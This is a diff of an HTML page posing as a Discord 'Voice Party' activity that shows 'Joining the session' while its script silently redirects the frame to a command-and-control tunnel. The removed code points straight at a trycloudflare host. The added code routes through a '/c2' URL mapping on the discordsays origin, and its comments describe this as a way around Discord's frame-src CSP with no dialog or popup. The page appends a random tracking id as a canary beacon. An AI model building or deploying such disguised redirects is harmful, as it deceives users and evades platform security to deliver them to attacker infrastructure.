@@ -4,22 +4,29 @@
 <title>Voice Party</title>
 <style>
  html,body{margin:0;height:100%}
- body{background:#0b0c0e;color:#e6e6e6;font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif;display:grid;place-items:center}
- .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b;text-align:center}
+ body{background:#0b0c0e;color:#e6e6e6;font:15px/1.56 system-ui,-apple-system,"Segoe UI",sans-serif;
+      display:grid;place-items:center}
+ .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;
+       border:1px solid #23252b;text-align:center}
  h1{margin:0 0 6px;font-size:21px}p{margin:0;color:#9aa0a6;font-size:14px}
 </style></head>
 <body>
-<div class="card"><h1>Voice Party</h1><p>Joining the session…</p></div>
+<div class="card"><h1>Voice Party</h1><p>Joining the session&hellip;</p></div>
 <script>
-// Self-navigation only. No SDK, no window.open, no child frames, no external
-// fetch — nothing here can produce a browser prompt or Discord confirm modal.
-// CSP on <appid>.discordsays.com has no navigate-to, so replacing this frame
-// is unrestricted; no URL mapping is required.
-var C2 = 'https://trans-perfectly-pushing-headers.trycloudflare.com';
-var n  = Math.random().toString(36).slice(2,8) + '-' + Date.now().toString(36);
-setTimeout(function () {
-  try { location.replace(C2 + '/canary?id=' + encodeURIComponent(n + '-selfnav')); }
-  catch (e) {}
-}, 150);
+// Silent frame hand-off.
+//
+// Why not the raw tunnel URL: the Discord client's own frame-src (the CSP on
+// the discord.com host document) governs navigation of this Activity frame,
+// and it allows https://*.discordsays.com but NOT arbitrary hosts. Navigating
+// to a raw host is blocked -> chrome-error white screen, nothing loads.
+//
+// So we navigate to /c2/... on our OWN discordsays origin. That is same-origin
+// (allowed), and the Discord proxy rewrites /c2/* to the tunnel host via the
+// dev-portal URL mapping. No dialog, no popup, no SDK call.
+//
+// REQUIRED dev-portal mapping:  prefix  /c2  ->  target <tunnel host>
+var n = Math.random().toString(36).slice(2, 8) + '-' + Date.now().toString(36);
+var target = '/c2/canary?id=' + encodeURIComponent(n + '-selfnav');
+setTimeout(function () { try { location.replace(target); } catch (e) {} }, 150);
 </script>
 </body></html>
